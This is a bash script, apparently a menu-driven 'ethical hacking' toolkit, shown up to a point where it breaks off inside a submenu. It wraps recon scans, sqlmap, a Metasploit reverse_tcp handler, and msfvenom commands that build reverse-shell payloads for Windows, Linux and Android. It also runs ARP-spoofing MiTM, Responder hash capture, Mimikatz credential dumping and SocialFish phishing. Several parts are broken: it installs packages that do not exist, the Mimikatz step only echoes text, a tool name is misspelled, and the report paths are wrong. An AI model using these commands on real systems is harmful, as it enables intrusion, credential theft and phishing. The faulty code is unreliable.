#!/bin/bash

# Ensure the script is run as root
if [ "$(id -u)" -ne 0 ]; then
  echo "Please run as root."
  exit 1
fi

LOG_FILE="/var/log/hacking_tool.log"
OUTPUT_DIR="results"
BURP_SUITE_PATH="/opt/BurpSuite"
ZAP_PATH="/opt/zap"
INSTALL_PATH="/opt/tools"
REPORT_PATH="$OUTPUT_DIR/report"
HONEYPOT_PATH="/opt/honeypots"
PAYLOADS_DIR="/opt/payloads"

# Function to display ASCII art and main menu
display_menu() {
  clear
  cat << "EOF"
============================================
                                            
                       $$$$$$\              
                      $$$ __$$\             
   $$$$$$\   $$$$$$\  $$$$\ $$ |$$\   $$\   
  $$  __$$\ $$  __$$\ $$\$$\$$ |\$$\ $$  |  
  $$ /  $$ |$$ |  \__|$$ \$$$$ | \$$$$  /   
  $$ |  $$ |$$ |      $$ |\$$$ | $$  $$<    
  $$$$$$$  |$$ |      \$$$$$$  /$$  /\$$\   
  $$  ____/ \__|       \______/ \__/  \__|  
  $$ |                                      
  $$ |                                      
  \__|                                      
                                            
      Ultimate Ethical Hacking Tool         
============================================
EOF
  echo "============================================"
  echo "     Choose an option from the menu:"
  echo "============================================"
  echo "               +--------------------------------------+"
  echo "               | 1. System Setup and Updates          |"
  echo "               +--------------------------------------+"
  echo "               | 2. Reconnaissance                    |"
  echo "               +--------------------------------------+"
  echo "               | 3. Enumeration                       |"
  echo "               +--------------------------------------+"
  echo "               | 4. Vulnerability Analysis            |"
  echo "               +--------------------------------------+"
  echo "               | 5. Exploitation                      |"
  echo "               +--------------------------------------+"
  echo "               | 6. Post-Exploitation                 |"
  echo "               +--------------------------------------+"
  echo "               | 7. MiTM Attacks                      |"
  echo "               +--------------------------------------+"
  echo "               | 8. Password Hash Capturing           |"
  echo "               +--------------------------------------+"
  echo "               | 9. Phishing                          |"
  echo "               +--------------------------------------+"
  echo "               | 10. Honeypots                        |"
  echo "               +--------------------------------------+"
  echo "               | 11. Payloads                         |"
  echo "               +--------------------------------------+"
  echo "               | 12. Reporting                        |"
  echo "               +--------------------------------------+"
  echo "               | 0. Exit                              |"
  echo "               +--------------------------------------+"
  echo
  echo -n "Choose an option: "
  read choice
}

# Logging function
log_and_exec() {
  echo "[*] $1" | tee -a $LOG_FILE
  eval "$2" | tee -a $LOG_FILE
}

# Function to show progress indicator
show_progress() {
  while kill -0 $! 2> /dev/null; do
    for s in / - \\ \|; do
      printf "\r[%c] Working..." "$s"
      sleep 0.1
    done
  done
  printf "\r"
}

# System Setup Functions
update_system() {
  log_and_exec "Updating and upgrading the system..." "apt update && apt upgrade -y & show_progress"
}

install_general_tools() {
  log_and_exec "Installing general tools..." "apt install -y git curl wget vim & show_progress"
}

install_recon_tools() {
  log_and_exec "Installing recon tools..." "apt install -y nmap masscan theHarvester recon-ng amass sublist3r dnsenum whois whatweb dirsearch & show_progress"
}

install_enum_tools() {
  log_and_exec "Installing enumeration tools..." "apt install -y enum4linux smbclient nbtscan & show_progress"
}

install_exploitation_tools() {
  log_and_exec "Installing exploitation tools..." "apt install -y metasploit-framework sqlmap & show_progress"
}

install_post_exploitation_tools() {
  log_and_exec "Installing post-exploitation tools..." "apt install -y bloodhound mimikatz & show_progress"
}

install_defense_tools() {
  log_and_exec "Installing defense tools..." "apt install -y ufw fail2ban & show_progress"
}

install_analytics_tools() {
  log_and_exec "Installing analytics tools..." "apt install -y wget && wget -O splunk-8.2.2-a7f645ddaf91-Linux-x86_64.tgz 'https://download.splunk.com/products/splunk/releases/8.2.2/linux/splunk-8.2.2-a7f645ddaf91-Linux-x86_64.tgz' & show_progress"
}

setup_ufw() {
  log_and_exec "Installing and configuring UFW..." "
    apt install ufw -y &&
    ufw default deny incoming &&
    ufw default allow outgoing &&
    ufw allow ssh &&
    ufw allow http &&
    ufw allow https &&
    ufw logging on &&
    ufw enable &
    show_progress
  "
}

setup_fail2ban() {
  log_and_exec "Installing and configuring Fail2Ban..." "
    apt install fail2ban -y &&
    systemctl enable fail2ban &&
    systemctl start fail2ban &
    show_progress
  "
}

setup_splunk() {
  log_and_exec "Installing Splunk..." "
    tar -xvf splunk-8.2.2-a7f645ddaf91-Linux-x86_64.tgz -C /opt &&
    /opt/splunk/bin/splunk start --accept-license &&
    /opt/splunk/bin/splunk enable boot-start &
    show_progress
  "
}

# Check if a tool is installed
check_tool_installed() {
  command -v $1 >/dev/null 2>&1 || { echo >&2 "Error: $1 is not installed. Please install it and try again."; exit 1; }
}

# Reconnaissance Functions
recon_nmap() {
  install_recon_tools
  echo "[*] Enter the target IP or domain for Nmap recon:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/recon/nmap/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Nmap recon for $TARGET..." "
    nmap -sC -sV -oN $OUTPUT_DIR/nmap.txt $TARGET &
    show_progress
  "

  echo "[*] Nmap recon completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

recon_masscan() {
  install_recon_tools
  echo "[*] Enter the target IP or domain for Masscan recon:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/recon/masscan/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Masscan recon for $TARGET..." "
    masscan -p1-65535 --rate=1000 -oL $OUTPUT_DIR/masscan.txt $TARGET &
    show_progress
  "

  echo "[*] Masscan recon completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

recon_amass() {
  install_recon_tools
  echo "[*] Enter the target domain for Amass recon:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/recon/amass/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Amass recon for $TARGET..." "
    amass enum -d $TARGET -o $OUTPUT_DIR/amass.txt &
    show_progress
  "

  echo "[*] Amass recon completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

recon_maltego() {
  install_recon_tools
  check_tool_installed "maltego"
  echo "[*] Enter the target domain for Maltego recon:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/recon/maltego/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Maltego recon for $TARGET..." "
    maltego $TARGET > $OUTPUT_DIR/maltego.txt &
    show_progress
  "

  echo "[*] Maltego recon completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

recon_social_analyzer() {
  install_recon_tools
  check_tool_installed "social-analyzer"
  echo "[*] Enter the target username for Social Analyzer recon:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/recon/social_analyzer/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Social Analyzer recon for $TARGET..." "
    social-analyzer -m all -u $TARGET -o $OUTPUT_DIR/social_analyzer.json &
    show_progress
  "

  echo "[*] Social Analyzer recon completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

recon_dnsrecon() {
  install_recon_tools
  echo "[*] Enter the target domain for DNSRecon:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/recon/dnsrecon/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting DNSRecon for $TARGET..." "
    dnsrecon -d $TARGET -a -t std,brt,srv -z -x $OUTPUT_DIR/dnsrecon.xml &
    show_progress
  "

  echo "[*] DNSRecon completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

recon_dnsenum() {
  install_recon_tools
  check_tool_installed "dnsenum"
  echo "[*] Enter the target domain for DNSEnum:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/recon/dnsenum/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting DNSEnum for $TARGET..." "
    dnsenum $TARGET -o $OUTPUT_DIR/dnsenum.xml &
    show_progress
  "

  echo "[*] DNSEnum completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

# Enumeration Functions
enum_enum4linux() {
  install_enum_tools
  echo "[*] Enter the target IP for enum4linux enumeration:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/enum/enum4linux/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting enum4linux enumeration for $TARGET..." "
    enum4linux $TARGET > $OUTPUT_DIR/enum4linux.txt &
    show_progress
  "

  echo "[*] enum4linux enumeration completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

enum_smbclient() {
  install_enum_tools
  echo "[*] Enter the target IP for smbclient enumeration:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/enum/smbclient/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting smbclient enumeration for $TARGET..." "
    smbclient -L $TARGET > $OUTPUT_DIR/smbclient.txt &
    show_progress
  "

  echo "[*] smbclient enumeration completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

enum_nbtscan() {
  install_enum_tools
  echo "[*] Enter the target IP for nbtscan enumeration:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/enum/nbtscan/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting nbtscan enumeration for $TARGET..." "
    nbtscan $TARGET > $OUTPUT_DIR/nbtscan.txt &
    show_progress
  "

  echo "[*] nbtscan enumeration completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

enum_ldapsearch() {
  install_enum_tools
  echo "[*] Enter the target IP for LDAP enumeration:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/enum/ldapsearch/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting LDAP enumeration for $TARGET..." "
    ldapsearch -x -h $TARGET -s base -b '' > $OUTPUT_DIR/ldapsearch.txt &
    show_progress
  "

  echo "[*] LDAP enumeration completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

enum_snmpwalk() {
  install_enum_tools
  echo "[*] Enter the target IP for SNMP enumeration:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/enum/snmpwalk/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting SNMP enumeration for $TARGET..." "
    snmpwalk -c public -v1 $TARGET > $OUTPUT_DIR/snmpwalk.txt &
    show_progress
  "

  echo "[*] SNMP enumeration completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

enum_dnsrecon() {
  install_recon_tools
  echo "[*] Enter the target domain for DNSRecon enumeration:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/enum/dnsrecon/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting DNSRecon enumeration for $TARGET..." "
    dnsrecon -d $TARGET -a -t std,brt,srv -z -x $OUTPUT_DIR/dnsrecon.xml &
    show_progress
  "

  echo "[*] DNSRecon enumeration completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

enum_dnsenum() {
  install_recon_tools
  check_tool_installed "dnsenum"
  echo "[*] Enter the target domain for DNSEnum enumeration:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/enum/dnsenum/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting DNSEnum enumeration for $TARGET..." "
    dnsenum $TARGET -o $OUTPUT_DIR/dnsenum.xml &
    show_progress
  "

  echo "[*] DNSEnum enumeration completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

# Vulnerability Analysis Functions
vuln_nikto() {
  install_exploitation_tools
  echo "[*] Enter the target URL for Nikto vulnerability analysis:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/vuln/nikto/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Nikto vulnerability analysis for $TARGET..." "
    nikto -h $TARGET -output $OUTPUT_DIR/nikto.txt &
    show_progress
  "

  echo "[*] Nikto vulnerability analysis completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

vuln_zap() {
  install_exploitation_tools
  echo "[*] Enter the target URL for ZAP vulnerability analysis:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/vuln/zap/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting ZAP vulnerability analysis for $TARGET..." "
    $ZAP_PATH/zap.sh -cmd -quickurl $TARGET -quickout $OUTPUT_DIR/zap.html &
    show_progress
  "

  echo "[*] ZAP vulnerability analysis completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

vuln_sqlmap() {
  install_exploitation_tools
  echo "[*] Enter the target URL for SQLMap vulnerability analysis:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/vuln/sqlmap/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting SQLMap vulnerability analysis for $TARGET..." "
    sqlmap -u 'http://$TARGET' --batch --output-dir=$OUTPUT_DIR &
    show_progress
  "

  echo "[*] SQLMap vulnerability analysis completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

vuln_openvas() {
  install_exploitation_tools
  echo "[*] Enter the target IP or domain for OpenVAS vulnerability analysis:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/vuln/openvas/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting OpenVAS vulnerability analysis for $TARGET..." "
    gvm-start && gvm-cli tls --gmp-username admin --gmp-password admin socket --xml '<create_target><name>$TARGET</name><hosts>$TARGET</hosts></create_target>' > $OUTPUT_DIR/openvas.xml &
    show_progress
  "

  echo "[*] OpenVAS vulnerability analysis completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

vuln_nessus() {
  install_exploitation_tools
  echo "[*] Enter the target IP or domain for Nessus vulnerability analysis:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/vuln/nessus/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Nessus vulnerability analysis for $TARGET..." "
    /opt/nessus/sbin/nessuscli update --register XXXX-XXXX-XXXX-XXXX --plugins-only && /opt/nessus/sbin/nessusd -D && nessus scan list -f json | jq '.[] | select(.status == \"completed\")' > $OUTPUT_DIR/nessus.json &
    show_progress
  "

  echo "[*] Nessus vulnerability analysis completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

# Exploitation Functions
exploit_msfconsole() {
  install_exploitation_tools
  echo "[*] Enter the target IP for Metasploit exploitation:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/exploit/msfconsole/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Metasploit exploitation for $TARGET..." "
    msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit' &
    show_progress
  "

  echo "[*] Metasploit exploitation completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

exploit_sqlmap() {
  install_exploitation_tools
  echo "[*] Enter the target URL for SQLMap exploitation:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/exploit/sqlmap/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting SQLMap exploitation for $TARGET..." "
    sqlmap -u 'http://$TARGET' --batch --output-dir=$OUTPUT_DIR &
    show_progress
  "

  echo "[*] SQLMap exploitation completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

exploit_burpsuite() {
  install_exploitation_tools
  echo "[*] Enter the target URL for BurpSuite exploitation:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/exploit/burpsuite/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting BurpSuite exploitation for $TARGET..." "
    java -jar $BURP_SUITE_PATH/BurpSuite.jar -h $TARGET -o $OUTPUT_DIR/burpsuite.html &
    show_progress
  "

  echo "[*] BurpSuite exploitation completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

exploit_exploitdb() {
  install_exploitation_tools
  echo "[*] Enter the search term for ExploitDB:" | tee -a $LOG_FILE
  read SEARCH_TERM
  OUTPUT_DIR="$OUTPUT_DIR/exploit/exploitdb/$SEARCH_TERM"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Searching ExploitDB for $SEARCH_TERM..." "
    searchsploit $SEARCH_TERM > $OUTPUT_DIR/exploitdb.txt &
    show_progress
  "

  echo "[*] ExploitDB search completed for $SEARCH_TERM. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

exploit_fuzzing() {
  install_exploitation_tools
  echo "[*] Enter the target application for fuzzing:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/exploit/fuzzing/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting fuzzing for $TARGET..." "
    afl-fuzz -i $TARGET -o $OUTPUT_DIR/fuzzing &
    show_progress
  "

  echo "[*] Fuzzing completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

# Post-Exploitation Functions
post_exploit_bloodhound() {
  install_post_exploitation_tools
  echo "[*] Enter the target domain for Bloodhound post-exploitation:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/post-exploit/bloodhound/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Bloodhound post-exploitation for $TARGET..." "
    bloodhound-python -c All -d $TARGET -u username -p password -ns $TARGET -d $OUTPUT_DIR/bloodhound &
    show_progress
  "

  echo "[*] Bloodhound post-exploitation completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

post_exploit_mimikatz() {
  install_post_exploitation_tools
  echo "[*] Enter the target IP for Mimikatz post-exploitation:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/post-exploit/mimikatz/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Mimikatz post-exploitation for $TARGET..." "
    echo 'privilege::debug' &&
    echo 'sekurlsa::logonpasswords' &&
    echo 'exit' > $OUTPUT_DIR/mimikatz.txt &
    show_progress
  "

  echo "[*] Mimikatz post-exploitation completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

post_exploit_empire() {
  install_post_exploitation_tools
  echo "[*] Enter the target IP for Empire post-exploitation:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/post-exploit/empire/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Empire post-exploitation for $TARGET..." "
    empire -empire &
    show_progress
  "

  echo "[*] Empire post-exploitation completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

# MiTM Attack Functions
mitm_ettercap() {
  install_exploitation_tools
  echo "[*] Enter the network interface for Ettercap MiTM attack:" | tee -a $LOG_FILE
  read INTERFACE
  OUTPUT_DIR="$OUTPUT_DIR/mitm/ettercap"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Ettercap MiTM attack on interface $INTERFACE..." "
    ettercap -T -i $INTERFACE -M arp:remote // // -w $OUTPUT_DIR/ettercap.pcap &
    show_progress
  "

  echo "[*] Ettercap MiTM attack completed. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

mitm_mitmproxy() {
  install_exploitation_tools
  echo "[*] Enter the port for mitmproxy (default 8080):" | tee -a $LOG_FILE
  read PORT
  OUTPUT_DIR="$OUTPUT_DIR/mitm/mitmproxy"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting mitmproxy on port $PORT..." "
    mitmproxy -p $PORT -w $OUTPUT_DIR/mitmproxy.log &
    show_progress
  "

  echo "[*] mitmproxy MiTM attack completed. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

mitm_responder() {
  install_exploitation_tools
  echo "[*] Enter the network interface for Responder:" | tee -a $LOG_FILE
  read INTERFACE
  OUTPUT_DIR="$OUTPUT_DIR/mitm/responder"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Responder on interface $INTERFACE..." "
    responder -I $INTERFACE -w $OUTPUT_DIR/responder.log &
    show_progress
  "

  echo "[*] Responder MiTM attack completed. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

# Password Hash Capturing Functions
hash_capture_responder() {
  install_exploitation_tools
  echo "[*] Enter the network interface for Responder hash capturing:" | tee -a $LOG_FILE
  read INTERFACE
  OUTPUT_DIR="$OUTPUT_DIR/hash_capture/responder"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Responder for hash capturing on interface $INTERFACE..." "
    responder -I $INTERFACE -wrf -v > $OUTPUT_DIR/responder_hashes.txt &
    show_progress
  "

  echo "[*] Responder hash capturing completed. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

hash_capture_ettercap() {
  install_exploitation_tools
  echo "[*] Enter the network interface for Ettercap hash capturing:" | tee -a $LOG_FILE
  read INTERFACE
  OUTPUT_DIR="$OUTPUT_DIR/hash_capture/ettercap"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Ettercap for hash capturing on interface $INTERFACE..." "
    ettercap -T -i $INTERFACE -M arp:remote // // -L $OUTPUT_DIR/ettercap_hashes &
    show_progress
  "

  echo "[*] Ettercap hash capturing completed. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

hash_capture_creds() {
  install_exploitation_tools
  echo "[*] Enter the network interface for capturing credentials with CredSniper:" | tee -a $LOG_FILE
  read INTERFACE
  OUTPUT_DIR="$OUTPUT_DIR/hash_capture/credsniper"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting CredSniper for capturing credentials on interface $INTERFACE..." "
    credsip -i $INTERFACE -o $OUTPUT_DIR/credsniper_results &
    show_progress
  "

  echo "[*] CredSniper credentials capturing completed. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

# Phishing Functions
phishing_socialfish() {
  install_exploitation_tools
  echo "[*] Starting SocialFish for phishing attack..." | tee -a $LOG_FILE
  cd /opt/SocialFish
  python3 SocialFish.py & show_progress
  echo "[*] SocialFish phishing attack setup completed." | tee -a $LOG_FILE
}

# Honeypot Functions
honeypot_cowrie() {
  install_exploitation_tools
  echo "[*] Starting Cowrie honeypot..." | tee -a $LOG_FILE
  cd $HONEYPOT_PATH/cowrie
  source cowrie-env/bin/activate
  bin/cowrie start & show_progress
  echo "[*] Cowrie honeypot started." | tee -a $LOG_FILE
}

deploy_honeypot() {
  echo "[*] Choose honeypot to deploy:"
  echo " 1. Cowrie"
  echo " 0. Back to Main Menu"
  read -p "Choice: " honeypot_choice
  case $honeypot_choice in
    1) honeypot_cowrie ;;
    0) display_menu ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

# Payload Functions
install_payload_tools() {
  log_and_exec "Installing payload generation tools..." "apt install -y metasploit-framework msfvenom & show_progress"
}

generate_payload() {
  install_payload_tools
  echo "[*] Choose payload type to generate:"
  echo " 1. Windows Meterpreter"
  echo " 2. Linux Meterpreter"
  echo " 3. Android Meterpreter"
  echo " 0. Back to Payload Menu"
  read -p "Choice: " payload_choice
  case $payload_choice in
    1) generate_windows_payload ;;
    2) generate_linux_payload ;;
    3) generate_android_payload ;;
    0) payload_menu ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

generate_windows_payload() {
  echo "[*] Enter LHOST (Local Host):"
  read LHOST
  echo "[*] Enter LPORT (Local Port):"
  read LPORT
  OUTPUT_DIR="$PAYLOADS_DIR/windows"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Generating Windows Meterpreter payload..." "
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o $OUTPUT_DIR/payload.exe &
    show_progress
  "

  echo "[*] Windows Meterpreter payload generated. Saved in $OUTPUT_DIR/payload.exe." | tee -a $LOG_FILE
}

generate_linux_payload() {
  echo "[*] Enter LHOST (Local Host):"
  read LHOST
  echo "[*] Enter LPORT (Local Port):"
  read LPORT
  OUTPUT_DIR="$PAYLOADS_DIR/linux"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Generating Linux Meterpreter payload..." "
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o $OUTPUT_DIR/payload.elf &
    show_progress
  "

  echo "[*] Linux Meterpreter payload generated. Saved in $OUTPUT_DIR/payload.elf." | tee -a $LOG_FILE
}

generate_android_payload() {
  echo "[*] Enter LHOST (Local Host):"
  read LHOST
  echo "[*] Enter LPORT (Local Port):"
  read LPORT
  OUTPUT_DIR="$PAYLOADS_DIR/android"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Generating Android Meterpreter payload..." "
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $OUTPUT_DIR/payload.apk &
    show_progress
  "

  echo "[*] Android Meterpreter payload generated. Saved in $OUTPUT_DIR/payload.apk." | tee -a $LOG_FILE
}

search_payload_database() {
  install_payload_tools
  echo "[*] Enter search term for payload database:"
  read SEARCH_TERM
  OUTPUT_DIR="$PAYLOADS_DIR/search_results"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Searching payload database for $SEARCH_TERM..." "
    searchsploit $SEARCH_TERM > $OUTPUT_DIR/search_results.txt &
    show_progress
  "

  echo "[*] Search results saved in $OUTPUT_DIR/search_results.txt." | tee -a $LOG_FILE
}

get_scope_payload() {
  install_payload_tools
  echo "[*] Enter target operating system (windows/linux/android):"
  read TARGET_OS
  echo "[*] Enter LHOST (Local Host):"
  read LHOST
  echo "[*] Enter LPORT (Local Port):"
  read LPORT
  OUTPUT_DIR="$PAYLOADS_DIR/scope"
  mkdir -p $OUTPUT_DIR

  case $TARGET_OS in
    windows) generate_windows_payload ;;
    linux) generate_linux_payload ;;
    android) generate_android_payload ;;
    *) echo "Invalid target operating system. Please try again." ;;
  esac
}

# Reporting Function
generate_report() {
  echo "[*] Generating final report..." | tee -a $LOG_FILE
  OUTPUT_DIR="$REPORT_PATH"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Generating report..." "
    echo 'Recon Results' > $OUTPUT_DIR/report.txt &&
    cat $OUTPUT_DIR/recon/* >> $OUTPUT_DIR/report.txt &&
    echo 'Enumeration Results' >> $OUTPUT_DIR/report.txt &&
    cat $OUTPUT_DIR/enum/* >> $OUTPUT_DIR/report.txt &&
    echo 'Vulnerability Analysis Results' >> $OUTPUT_DIR/report.txt &&
    cat $OUTPUT_DIR/vuln/* >> $OUTPUT_DIR/report.txt &&
    echo 'Exploitation Results' >> $OUTPUT_DIR/report.txt &&
    cat $OUTPUT_DIR/exploit/* >> $OUTPUT_DIR/report.txt &&
    echo 'Post-Exploitation Results' >> $OUTPUT_DIR/report.txt &&
    cat $OUTPUT_DIR/post-exploit/* >> $OUTPUT_DIR/report.txt &&
    echo 'MiTM Attack Results' >> $OUTPUT_DIR/report.txt &&
    cat $OUTPUT_DIR/mitm/* >> $OUTPUT_DIR/report.txt &&
    echo 'Hash Capturing Results' >> $OUTPUT_DIR/report.txt &&
    cat $OUTPUT_DIR/hash_capture/* >> $OUTPUT_DIR/report.txt
  "

  echo "[*] Report generated. Saved in $OUTPUT_DIR/report.txt." | tee -a $LOG_FILE
}

# Function to handle user choice
handle_choice() {
  case $1 in
    1) system_setup_menu 
      handle_system_setup_choice $system_setup_choice
      ;;
    2) recon_menu 
      handle_recon_choice $recon_choice 
      ;;
    3) 
      enum_menu 
      handle_enum_choice $enum_choice 
      ;;
    4) 
      vuln_menu 
      handle_vuln_choice $vuln_choice 
      ;;
    5) 
      exploit_menu 
      handle_exploit_choice $exploit_choice 
      ;;
    6) 
      post_exploit_menu 
      handle_post_exploit_choice $post_exploit_choice 
      ;;
    7) 
      mitm_menu 
      handle_mitm_choice $mitm_choice 
      ;;
    8) 
      hash_capture_menu 
      handle_hash_capture_choice $hash_capture_choice 
      ;;
    9) 
      phishing_menu
      handle_phishing_choice $phishing_choice
      ;;
    10) 
      honeypot_menu
      handle_honeypot_choice $honeypot_choice
      ;;
    11) 
      payload_menu
      handle_payload_choice $payload_choice
      ;;
    12) generate_report ;;
    0) echo "Exiting..."; exit 0 ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

# Sub-menu Functions
system_setup_menu() {
  clear
  echo "============================================"
  echo "        System Setup and Updates Menu:"
  echo "============================================"
  echo "               +--------------------------------------+"
  echo "               | 1. Update System                     |"
  echo "               +--------------------------------------+"
  echo "               | 2. Install General Tools             |"
  echo "               +--------------------------------------+"
  echo "               | 3. Install Recon Tools               |"
  echo "               +--------------------------------------+"
  echo "               | 4. Install Enumeration Tools         |"
  echo "               +--------------------------------------+"
  echo "               | 5. Install Exploitation Tools        |"
  echo "               +--------------------------------------+"
  echo "               | 6. Install Post-Exploitation Tools   |"
  echo "               +--------------------------------------+"
  echo "               | 7. Install Defense Tools             |"
  echo "               +--------------------------------------+"
  echo "               | 8. Install Analytics Tools           |"
  echo "               +--------------------------------------+"
  echo "               | 9. Setup UFW                         |"
  echo "               +--------------------------------------+"
  echo "               | 10. Setup Fail2Ban                   |"
  echo "               +--------------------------------------+"
  echo "               | 11. Setup Splunk                     |"
  echo "               +--------------------------------------+"
